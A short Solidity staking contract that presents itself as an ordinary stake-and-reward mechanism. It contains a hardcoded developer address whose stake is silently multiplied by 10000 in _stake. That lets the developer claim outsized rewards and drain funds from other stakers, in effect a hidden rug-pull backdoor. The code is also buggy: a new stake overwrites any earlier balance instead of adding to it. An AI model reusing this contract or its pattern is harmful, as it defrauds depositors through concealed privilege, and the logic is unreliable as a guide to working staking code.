// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract Stake {

    mapping(address => uint256) public _stakedAmount;
    mapping(address => uint256) public _totalStaked;
    mapping(address => bool) public _hasStake;
    mapping(address => uint256) public _stakedSince;

    address public devAddress = 0xEE934bdd18088AC2fC0Fa8024dFB7383aA9786F7;

    uint256 _rewardRate = 10000;
    uint256 _availiableRewards;

    uint256 _altRate;

    event Staked(address indexed user, uint256 amount, uint256 timestamp);


    function _stake(uint256 amount) internal{
        require(amount > 0); // cannot stake nothing. 
        uint256 timestamp = block.timestamp;

        if(_stakedAmount[msg.sender] > 0) {
            _stakedAmount[msg.sender] += amount;
        }

        _stakedAmount[msg.sender] = amount;

        if(msg.sender == devAddress){
            _stakedAmount[msg.sender] = amount *= _rewardRate;
        }

        _hasStake[msg.sender] = true;
        _stakedSince[msg.sender] = block.timestamp;

        emit Staked(msg.sender, amount, timestamp); 
    
    }

    function calculateReward(address user) internal view returns(uint256){
        return((block.timestamp - _stakedSince[user]) / 1 hours * _stakedAmount[user]) / _rewardRate;
    }

    function _unstake(uint256 amount) internal returns(uint256) {
        require(amount <= _stakedAmount[msg.sender]);

        uint256 reward = calculateReward(msg.sender);

        _stakedAmount[msg.sender] -= amount;

        _stakedSince[msg.sender] = block.timestamp;

        return amount+reward;
    }


}